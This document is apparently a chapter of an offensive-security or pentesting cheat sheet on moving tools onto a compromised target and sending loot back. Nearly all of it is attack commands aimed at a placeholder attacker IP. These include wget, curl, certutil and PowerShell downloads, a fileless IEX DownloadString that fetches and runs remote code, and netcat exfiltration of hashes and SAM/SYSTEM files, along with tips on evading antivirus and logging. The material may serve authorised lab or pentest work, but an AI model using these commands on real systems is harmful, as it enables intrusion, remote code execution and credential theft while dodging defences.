# 09 · File transfers

Getting tools onto a target and loot back off it. Have one method per direction that always works,
plus fallbacks for when there's no wget/no python/egress filtering.

---

## Serve from your attacker box

```bash
python3 -m http.server 80              # HTTP (most common)
php -S 0.0.0.0:80                       # if python is busy
impacket-smbserver share . -smb2support        # SMB — great for Windows
impacket-smbserver share . -smb2support -user u -password p    # authed (Win10/11 refuse guest)
```

## Download to a Linux target

```bash
wget http://<ip>/linpeas.sh -O /tmp/l.sh
curl http://<ip>/l.sh -o /tmp/l.sh
# no wget/curl? use /dev/tcp or scp
scp file user@<target>:/tmp/
```

## Download to a Windows target

```powershell
certutil -urlcache -split -f http://<ip>/nc.exe C:\Windows\Temp\nc.exe    # classic LOLBin
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ip>/x.exe','C:\Temp\x.exe')"
powershell -c "IWR http://<ip>/x.exe -OutFile C:\Temp\x.exe"
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/x.ps1')"   # fileless
copy \\<ip>\share\x.exe C:\Temp\        # SMB (from impacket-smbserver)
```

> 💡 `certutil`/`bitsadmin` are LOLBins — handy when PowerShell is locked down, but noisy in logs.
> `IEX(...DownloadString)` never touches disk, which dodges basic file-based AV.

## Exfil loot back to you

```bash
# through a listener (target → you)
nc -lvnp 9999 > loot.zip          # you
nc -w3 <ip> 9999 < loot.zip       # target (Linux)
# tiny files: base64 on the target, paste, base64 -d on your side
# Windows: copy to your impacket-smbserver share, or File.CopyTo a TcpClient stream
```

> 💡 Behind a pivot, point transfers at the **pivot/agent IP + a relayed listener port**, not at your
> Kali directly (see [§07](07-pivoting-and-tunneling.md)).

## Before you move on

- [ ] A working download path onto the target (HTTP or SMB) confirmed.
- [ ] A working exfil path off it (for hashes, SAM/SYSTEM, configs).
- [ ] Enumeration tools (linpeas/winPEAS/pspy) staged where they're writable/executable (`/tmp`, `C:\Windows\Temp`).
